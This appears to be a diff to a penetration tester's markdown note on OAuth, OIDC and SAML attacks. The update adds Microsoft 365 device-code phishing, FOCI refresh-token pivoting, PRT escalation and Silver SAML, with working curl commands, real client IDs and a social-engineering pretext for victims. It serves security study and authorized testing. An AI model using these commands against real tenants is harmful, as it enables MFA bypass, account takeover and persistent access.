@@ -1,12 +1,10 @@
 # OAuth / OIDC / SAML Attacks
 
-#OAuth #OIDC #SAML #Authentication #WebAppAttacks
-
+#OAuth #OIDC #SAML #Authentication #WebAppAttacks #DeviceCodePhishing #FOCI #GoldenSAML #SilverSAML #EntraID #jwt_tool #BurpSuite
 
 ## What is this?
 
-Attack techniques for the three major auth delegation frameworks: OAuth 2.0, OpenID Connect, and SAML. Covers token theft, redirect abuse, CSRF, XML signature attacks, and ATO chains. Pairs with [[JWT Attacks]], [[Web Attacks]].
-
+Attack techniques for the three major auth delegation frameworks: OAuth 2.0, OpenID Connect, and SAML. Covers token theft, redirect abuse, CSRF, XML signature attacks, device code phishing, and ATO chains. Pairs with [[JWT Attacks]], [[Web Attacks]].
 
 ---
 
@@ -14,11 +12,12 @@ Attack techniques for the three major auth delegation frameworks: OAuth 2.0, Ope
 
 | Tool | Purpose |
 |---|---|
-| `Burp Suite` | Intercept OAuth flows, tamper redirect_uri/state/code, match & replace rules |
-| `jwt_tool` | Attack JWT-based OAuth/OIDC tokens — algorithm confusion, none alg, brute force |
-| `SAMLRaider` | Burp extension — SAML manipulation, XXE in assertions, XSW attacks (BApp Store) |
-| `SAML-tracer` | Firefox extension — inspect full SAML flows in browser |
-| `TokenSpy` | Hunt for OAuth tokens exposed in JS — `git clone https://github.com/dub-flow/tokenspy` |
+| [[Tools/Web/Burpsuite\|Burp Suite]] | Intercept OAuth flows, tamper redirect_uri/state/code, match & replace rules |
+| [[Tools/Web/jwt_tool\|jwt_tool]] | Attack JWT-based OAuth/OIDC tokens — algorithm confusion, none alg, brute force |
+| [SAMLRaider](https://github.com/portswigger/saml-raider) | Burp extension — SAML manipulation, XXE in assertions, XSW attacks (BApp Store) |
+| [SAML-tracer](https://addons.mozilla.org/firefox/addon/saml-tracer/) | Firefox extension — inspect full SAML flows in browser |
+| [[Tools/Cloud/TokenTactics\|TokenTactics]] | Request/refresh/renew Entra tokens across FOCI clients (device-code + token abuse) |
+| [[Tools/Web/TokenSpy\|TokenSpy]] | Hunt for OAuth tokens exposed in JS |
 
 ---
 
@@ -163,6 +162,30 @@ curl -s "https://<target>/app.js" | grep -oP "client_?id['\": ]+['\"]?\K[A-Za-z0
 curl -s "https://<target>/app.js" | grep -oP "client_?secret['\": ]+['\"]?\K[A-Za-z0-9_-]+"
 ```
 
+### Device Code Phishing
+
+The device-authorization grant (RFC 8628) was built for input-constrained devices (TVs, CLIs): the device shows a short user-code and a URL, the user enters it on a second device, and the device polls the token endpoint until they approve. Abused for phishing, **the victim signs in on the *real* IdP page and completes their own MFA** — then hands the attacker a fully authenticated token. This is the technique behind the Storm-2372 M365 campaign (active since Aug 2024); it defeats MFA because nothing about the login is fake except who initiated it.
+
+```bash
+# 1. Attacker requests a device code (public client — no secret needed)
+curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" \
+  -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default offline_access"
+# Returns: user_code, device_code, verification_uri (microsoft.com/devicelogin), expires_in (~15 min), interval
+
+# 2. Attacker sends the user_code to the victim within the 15-min window, socially
+#    engineered as a "code to join the Teams meeting / verify your account."
+#    Victim goes to microsoft.com/devicelogin, enters the code, does THEIR OWN MFA.
+
+# 3. Attacker polls the token endpoint until the victim approves
+curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
+  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&device_code=<device_code>"
+# Pending → {"error":"authorization_pending"}; on approval → access_token + refresh_token
+```
+
+> [!tip] [[Tools/Cloud/TokenTactics|TokenTactics]] (`Invoke-DeviceCodeAttack`) and `AADInternals` automate the request-code → poll → capture-token loop, and refresh across FOCI clients afterwards. See [[Services/Active Directory/Entra ID|Entra ID]] for the broader M365 attack chain.
+
+> [!warning] The 15-minute window and the "enter this code" pretext are the whole attack — there's nothing to detect in the auth itself (real page, real MFA). It's phishing/social-engineering; treat it as in scope only under an engagement that explicitly authorizes user-targeted phishing.
+
 ---
 
 ## OIDC (OpenID Connect)
@@ -234,6 +257,36 @@ curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
 ```
 
 > [!warning] Azure refresh tokens are scoped to a client_id — a token captured from one app may not be replayable against a different client_id without a client_secret.
+
+### FOCI — Family of Client IDs
+
+The reason the public client_ids above matter: Microsoft groups certain first-party apps into a **Family of Client IDs (FOCI)**. A refresh token obtained for *any* app in the family can be redeemed for an access token to *any other* app in the same family — no re-auth, no client secret, no additional consent. So one token phished via the Office client silently pivots to Outlook, Teams, OneDrive, SharePoint, and the Azure Management API.
+
+```bash
+# Redeem a FOCI refresh token for a DIFFERENT resource, swapping only the scope
+# (same refresh_token, same family — Azure returns a token for the new audience)
+curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
+  -d "grant_type=refresh_token&refresh_token=<foci_rt>&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://outlook.office365.com/.default offline_access"
+
+# Same token → Azure Resource Manager
+curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
+  -d "grant_type=refresh_token&refresh_token=<foci_rt>&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://management.azure.com/.default offline_access"
+```
+
+> [!tip] [[Tools/Cloud/TokenTactics|TokenTactics]] and `roadtx` (ROADtools) handle FOCI refresh natively — `Invoke-RefreshTo<Resource>` mints a token for each target service from one captured refresh token.
+
+### PRT Escalation via the Auth Broker Client
+
+Storm-2372's escalation: use a phished refresh token to authenticate as the **Microsoft Authentication Broker** client (`29d9ed98-a469-4536-ade2-f981bc1d605e`), register an attacker-controlled device in Entra ID, then mint a **Primary Refresh Token (PRT)** for it. A PRT is durable, device-bound SSO material — far stronger persistence than a single refresh token.
+
+```bash
+# Request a token for the Auth Broker client (device registration scope)
+curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
+  -d "grant_type=refresh_token&refresh_token=<foci_rt>&client_id=29d9ed98-a469-4536-ade2-f981bc1d605e&scope=https://enrollment.manage.microsoft.com/.default offline_access"
+# Then register a device (roadtx device / AADInternals) and request a PRT — see Entra ID note
+```
+
+> [!note] Device registration and PRT minting are the persistence half of this chain — the full workflow (`roadtx`, `AADInternals Join-AADIntDeviceToAzureAD` / `Get-AADIntUserPRTToken`) lives in [[Services/Active Directory/Entra ID|Entra ID]].
 
 ---
 
@@ -363,6 +416,23 @@ python3 ADFSpoof.py -b adfs-signing.pfx <pass> saml2 \
   --assertions '<saml:Attribute ...>Admin</saml:Attribute>'
 ```
 
+### Silver SAML (Entra ID, 2024)
+
+Golden SAML's cloud cousin. When an Entra ID enterprise app uses an **externally-generated** token-signing certificate (imported into Entra, rather than Microsoft-generated), whoever holds that certificate's private key can forge SAML responses for the app — from *outside* the tenant, with no ADFS and no domain compromise. Golden-SAML defenses don't catch it because the signing happens off Microsoft's infrastructure.
+
+```text
+# Preconditions to hunt for:
+#  - Entra enterprise app configured for SAML SSO
+#  - Its signing cert was imported (has an exportable/known private key),
+#    not generated in the Azure portal
+#  - The private key leaked (dev machine, CI secret store, Key Vault, cert backup)
+
+# With the private key, forge an assertion for any user — SilverSAMLForger (Semperis PoC):
+#   https://github.com/Semperis/SilverSAMLForger
+```
+
+> [!note] Mitigation (and the tell that a target is *not* vulnerable): Microsoft-generated certs created in the Azure portal can't have their private keys exported, so Silver SAML needs a cert that was imported. If the app uses a portal-generated cert, this path is closed — pivot back to Golden SAML / token theft.
+
 ---
 
 ## Quick Reference
@@ -388,10 +458,16 @@ python3 jwt_tool.py <token> -X a
 
 # SAML comment injection for NameID
 # admin<!--@target.com (parsed as "admin" by some libraries)
+
+# Device code phishing — request a code, socially deliver it, poll for the token
+curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default offline_access"
+
+# FOCI pivot — one refresh token → any family app (swap scope only)
+curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" -d "grant_type=refresh_token&refresh_token=<rt>&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://outlook.office365.com/.default offline_access"
 ```
 
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-07-21*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-31*
+*Model: claude-opus-5*
